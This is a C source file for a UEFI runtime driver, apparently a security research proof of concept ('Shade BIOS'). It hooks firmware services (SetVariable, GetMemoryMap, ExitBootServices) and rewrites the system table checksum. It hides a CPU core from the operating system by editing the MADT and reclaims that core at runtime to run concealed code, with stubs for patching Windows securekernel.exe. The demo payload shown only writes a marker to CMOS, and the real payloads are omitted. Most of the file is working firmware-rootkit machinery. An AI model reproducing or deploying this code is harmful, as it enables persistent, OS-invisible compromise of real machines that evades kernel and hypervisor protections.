/*
 * (c) FFRI Security, Inc., 2026 / Author: FFRI Security, Inc.
 */

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/DevicePathLib.h>
#include <Library/IoLib.h>
#include <Library/PrintLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/AcpiSystemDescriptionTable.h>
#include <Protocol/AcpiTable.h>
#include <Protocol/LoadedImage.h>
#include "pe.h"
#include "identity.h"
#include "Mutex.h"
#include "MatModify.h"
#include "Cmos.h"
#include "elf.h"
#include "common.h"
#include "Timer.h"
#include "MadtModify.h"
#include "ShadeCoreCom.h"
#include "PhyMemScan.h"

EFI_STATUS EFIAPI ShadeCoreMain();
#include "Processor.h"


// 
// Processor ID and APIC ID which will turn into ShadeCore
//   - Required to specify the LAST processor on the target PC
//   - This hard coding can be avoided by using CPUID to read processor info
//     and determines the last processor ProcID & ApicID
//
#define SHADE_CORE_PROCESSOR_ID // ENTER HERE (Ex: If you have 8 logical cores, enter 7)
#define SHADE_CORE_APIC_ID // ENTER HERE



EFI_SET_VARIABLE gOrigSetVariable;
EFI_GET_MEMORY_MAP gOrigGetMemoryMap;
EFI_EXIT_BOOT_SERVICES gOrigExitBootServices;

EFI_GUID gEfiEventVirtualAddressChangeGuid = \
  { 0x13FA7698, 0xC831, 0x49C7, { 0x87, 0xEA, 0x8F, 0x43, 0xFC, 0xC2, 0x51, 0x96 }};
EFI_EVENT gEfiEventVirtualAddressChange = NULL;


EFI_STATUS
EFIAPI
ShadeCoreMain(
    )
{
  PlatformCmosWrite8(0x7C, 0xDE);
  PlatformCmosWrite8(0x7D, 0xAD);
  PlatformCmosWrite8(0x7E, 0xBE);
  PlatformCmosWrite8(0x7F, 0xEF);
  return EFI_SUCCESS;
}


// 
// [Omitted] Main function that executes at ShadeCore during runtime
//  - This ShadeCoreMain is for Qubes OS demo
//  - ShadeCoreMainWin is for Windows demo
//
EFI_STATUS
EFIAPI
ShadeCoreMainQubes(
    )
{
  // 1: Find Demo ELF binary by BuildId
  // 2: Patch Demo ELF binary from ShadeCore :)
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ShadeCoreMainWin(
    )
{
  // Find securekernel.exe and patch SkpsIsProcessDebuggingEnabled
  return EFI_SUCCESS;
}


//
// Function to trigger ShadeCore from non-ShadeCore runtime DXE driver
//
VOID
ExecShadeCore(
    )
{
  *(UINT32*)gShadeCoreStartupSignalBufferVirAddr = WAKEUP_SHADE_CORE_SIGNAL;
  AcpiTimerStall(100000);
  return;
}



//
// ExitBootServices will reset APs so take control back of ShadeCore by reinitializing it
//   - winload.efi!OslFwpKernelSetupPhase1, xen.efi will call gBS->ExitBootServices()
//
EFI_STATUS
EFIAPI
ExitBootServicesHook(
    IN EFI_HANDLE ImageHandle,
    IN UINTN      MapKey
    )
{
  EFI_STATUS Status;
  Print(L"ExitBootServicesHook entry\r\n");

  if(IsX2ApicEnabled()) {
    Print(L"x2APIC not supported!\n");
    while(1) {};
  }

  // 1: [Omitted] Prepare map for physical memory scanning during runtime
  PrepareScanMap();

  // 2: Prepare SIPI Vector
  SetupISS();

  // 3: Call original ExitBS
  //   - Some BIOS will initialize all APs by sending INIT-SIPI-SIPI sequence here
  //   - Don't use `Print` between GetMemoryMap & ExitBS (Print will change memory map)
  gBS->ExitBootServices = gOrigExitBootServices;
  UINTN                 MemoryMapSize = 0;
  EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
  UINTN                 LocalMapKey;
  UINTN                 DescriptorSize = 0;
  UINT32                DescriptorVersion = 0;
  Status = gBS->GetMemoryMap(
      &MemoryMapSize,
      MemoryMap,
      &LocalMapKey,
      &DescriptorSize,
      &DescriptorVersion
      );
  if (Status == EFI_BUFFER_TOO_SMALL) {
      Status = gBS->AllocatePool(
          EfiLoaderData,
          MemoryMapSize + 2*DescriptorSize,
          (VOID**)&MemoryMap
          );
      Status = gBS->GetMemoryMap(
          &MemoryMapSize,
          MemoryMap,
          &LocalMapKey,
          &DescriptorSize,
          &DescriptorVersion
          );
  }
  Status = gOrigExitBootServices(ImageHandle,LocalMapKey); 

  // vvvvvvvvvvvvvvv Don't use `Print` after successful ExitBS vvvvvvvvvvvvvvvvv

  // 4: Acquire control of ShadeCore by reinitializing it
  SendISS((BYTE)(gVector>>12), SHADE_CORE_APIC_ID);

  return Status;
}



#define MAGIC_VAR_NAME L"MyRtDxeTrig"
BOOLEAN gDone = FALSE;
/**

  SetVariable Hook
    - Trigger this Shade BIOS malbehavior when called with MAGIC_VAR_NAME
    - Hook gRT->GetVariable() instead to trigger this automatically (without client program)

**/
EFI_STATUS
EFIAPI
SetVariableHook(
    IN  CHAR16    *VariableName,
    IN  EFI_GUID  *VendorGuid,
    IN  UINT32    Attributes,
    IN  UINTN     DataSize,
    IN  VOID      *Data
    )
{
  EFI_STATUS Status;

  if(VariableName!=NULL && StrnCmp(VariableName, MAGIC_VAR_NAME, (sizeof(MAGIC_VAR_NAME)/sizeof(CHAR16))-1) == 0) {
    if(gDone) {
      return EFI_SUCCESS;
    }

    // Debug
    __asm__ __volatile__("int3");
    ExecShadeCore();
    __asm__ __volatile__("int3");

    gDone = TRUE;
    return Status;
  }

  return gOrigSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data); 
}



//
// Modify Attribute of the memory map (copy) descriptor of where this module
// is located to EFI_RUNTIME_MEMORY
//   - winload.efi!OslFwMapRuntimeRanges will OR the attribute of EFI memory map (copy)
//     and the attribute of the MAT
//   - e.g., When, EFI memory map is (RUNTIME | XP), and MAT is (RUNTIME | RO), 
//     final attribute will be (RUNTIME | XP | RO) which is invalid and will not
//     be mapped to the EPT
//
EFI_STATUS
EFIAPI
GetMemoryMapHook (
    IN OUT  UINTN                  *MemoryMapSize,
    OUT     EFI_MEMORY_DESCRIPTOR  *MemoryMap,
    OUT     UINTN                  *MapKey,
    OUT     UINTN                  *DescriptorSize,
    OUT     UINT32                 *DescriptorVersion
    )
{
  EFI_STATUS Status;

  Status = gOrigGetMemoryMap(
      MemoryMapSize,
      MemoryMap,
      MapKey,
      DescriptorSize,
      DescriptorVersion
      );

  if (Status!=EFI_SUCCESS) {
    return Status;
  }

  // Modify memory map Attribute
  UINTN MapEntries = *MemoryMapSize / *DescriptorSize;

  for(UINTN i=0; i<MapEntries; i++) {
    EFI_MEMORY_DESCRIPTOR *desc = (EFI_MEMORY_DESCRIPTOR*)( (UINTN)MemoryMap + (i*(*DescriptorSize)) );
    UINTN start = desc->PhysicalStart;
    UINTN end   = start + desc->NumberOfPages*EFI_PAGE_SIZE;

    if (start<(UINTN)SetVariableHook && (UINTN)SetVariableHook<end) {
      // Comment out with Qubes OS
      /*desc->Attribute = EFI_MEMORY_RUNTIME;*/
    }
  }

  return Status;
}



VOID
EFIAPI
SetVirtualAddressMapEvent(
    IN  EFI_EVENT  Event,
    IN  VOID       *Context
    )
{
  gRT->ConvertPointer(0, (VOID**)&gOrigSetVariable);
  gRT->ConvertPointer(0, (VOID**)&gRT);
  gRT->ConvertPointer(0, (VOID**)&gIdentityCR3);
  gRT->ConvertPointer(0, (VOID**)&gSipiVectorAddr);
  gRT->ConvertPointer(0, (VOID**)&gShadeCoreStartupSignalBufferVirAddr);
  gRT->ConvertPointer(0, (VOID**)&gShadeCoreComBufVirAddr);
}



EFI_STATUS
EFIAPI
DriverEntry (
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
  EFI_STATUS Status;
  Print(L">>> ShadeCoreDxe DriverEntry\n");

  //
  // 1: Execute this driver only once
  //
  if(!CheckMutex())
    return EFI_SUCCESS;

  // 
  // 2: Prepare Identity Page Tables
  //   - Used in ShadeCore
  //
  MakeIdentityPageTable();
  Print(L"MakeIdentityPageTable done\n");

  // 
  // 3: Create SetVirtualAddressMap Event
  //
  Status = gBS->CreateEventEx(
      EVT_NOTIFY_SIGNAL,
      TPL_NOTIFY,
      SetVirtualAddressMapEvent,
      NULL,
      &gEfiEventVirtualAddressChangeGuid,
      &gEfiEventVirtualAddressChange
      );
  Print(L"CreateEvent(SetVirtualAddressMapEvent) %r\n", Status);

  //
  // 4: Hook SetVariable & GetMemoryMap & ExitBootServices
  //
  EFI_TPL tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);

  gOrigSetVariable = gRT->SetVariable;
  gRT->SetVariable = SetVariableHook;
  gOrigGetMemoryMap = gBS->GetMemoryMap;
  gBS->GetMemoryMap = GetMemoryMapHook;
  gOrigExitBootServices = gBS->ExitBootServices;
  gBS->ExitBootServices = ExitBootServicesHook;
  
  gST->Hdr.CRC32 = 0;
  gBS->CalculateCrc32(&gST->Hdr, gST->Hdr.HeaderSize, &gST->Hdr.CRC32);
  gBS->RestoreTPL(tpl);
  Print(L"Hooked SetVariable & GetMemoryMap & ExitBootServices\n");

  //
  // 5: Prepare Shade Core
  //
  InitAcpiPmTimer();

  InitComBuf();

  ModifyMADT(SHADE_CORE_PROCESSOR_ID);

  ModifyMAT(ImageHandle);

  Print(L"<<< End of DriverEntry\n");
  return EFI_SUCCESS;
}
